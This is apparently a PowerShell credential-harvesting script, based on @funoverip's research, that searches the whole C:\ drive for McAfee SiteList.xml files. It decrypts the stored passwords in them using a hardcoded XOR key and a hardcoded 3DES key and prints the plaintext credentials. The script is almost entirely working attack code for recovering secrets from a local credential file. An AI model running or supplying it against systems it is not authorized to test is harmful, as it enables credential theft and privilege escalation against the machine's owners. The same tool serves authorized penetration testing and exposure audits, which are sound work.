<#

Based on the work of @funoverip
https://github.com/funoverip/mcafee-sitelist-pwd-decryption\

#>

function Get-DecryptTripleDESPassword($passwordByte, $key) {  
    try{              
        $arrayKey = $key -split ', '
        $keyByte = @()
        foreach($ak in $arrayKey){
            $keyByte += [System.Convert]::ToByte($ak,16)        
        }
        $TripleDES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider                
        $TripleDES.Key = $keyByte
        $TripleDES.Mode = [System.Security.Cryptography.CipherMode]::ECB
        $TripleDES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $decryptorObject = $TripleDES.CreateDecryptor()
        [byte[]] $outBlock = $decryptorObject.TransformFinalBlock($passwordByte, 0 , $passwordByte.Length)

        $TripleDES.Clear()

        return [System.Text.UnicodeEncoding]::Default.GetString($outBlock)
     }
     catch {
        Write-Error $_
    }
}


function Get-XOR ($toBeXored) {
    $keyByte = @()
    $arrayXorKey = "12,15,0F,10,11,1C,1A,06,0A,1F,1B,18,17,16,05,19" -split ','
    foreach($axk in $arrayXorKey){
        $keyByte += [System.Convert]::ToByte($axk,16)  
    }    
	$j = 0
	$output=''
    $conversion = $null
    $tot = $toBeXored.Length
    $i=0
	while ($i -lt $tot) {
		$output = ($toBeXored[$i] -bxor $keyByte[$j])

        if($i -gt 0) {
            $conversion += ",$output"
        }
        else {
            $conversion += "$output"
        }    
		$j++
		if (($j%16) -eq 0) {
			$j=0	
        }
        $i++
    }
    $conversion
}

function Get-MacAfeeInnerFields {
    [CmdletBinding()]
        Param (
            $File 
        )
                
    $Filename = Split-Path $File -Leaf
    [xml] $Xml = Get-Content ($File)
    
    $passwordEncrypted = @()
    $passwordStore = @()
        
    if ($Xml.innerxml -like "*Password*"){            
        Write-Verbose "Potential password in $File"        
        $passwordEncrypted = $Xml.GetElementsByTagName("Password")
    }
              
    foreach ($pass in $passwordEncrypted) {
        Write-Verbose "Decrypting $($Pass.InnerXML)"
        $decryptedPassword = Get-DecryptedPassword $Pass.InnerXML
        Write-Verbose "Decrypted a password of $decryptedPassword"        
        $passwordStore += , $decryptedPassword
    }
            
    if (!($passwordStore)) {$passwordStore = '<empty>'}
                  
    $ObjectProperties = @{'Passwords' = $passwordStore}
                
    $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
    Write-Verbose "The password is between {} and may be more than one value."
    if ($ResultsObject) {Return $ResultsObject}         
}    
function Get-DecryptedPassword ($stringFound) {
    $base64Decoded = [Convert]::FromBase64String($stringFound)     

    $passwordToBeDecrypted = Get-XOR $base64Decoded

    $desKey = ("0x3E, 0xF1, 0x36, 0xB8, 0xB3, 0x3B, 0xEF, 0xBC, 0x34, 0x26, 0xA7, 0xB5, 0x4E, 0xC4, 0x1A, 0x37, 0x7C, 0xD3, 0x19, 0x9B, 0x00, 0x00, 0x00, 0x00")

    $passwordToBeDecryptedBytes = @()
    $passwordToBeDecryptedBytes = $passwordToBeDecrypted -split ','

    $passwordRevealed = Get-DecryptTripleDESPassword $passwordToBeDecryptedBytes $desKey
    $passwordRevealed
}

# You can check this path only $file = "C:\Documents and Settings\All Users\Application Data\McAfee\Common Framework\SiteList.xml"

$XMlFiles = Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue -Include 'SiteList.xml'

Write-Output "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

foreach ($file in $XMLFiles) {
    $results = (Get-MacAfeeInnerFields $file)
    foreach ($result in $results) {          
        $result.Passwords
    }

}
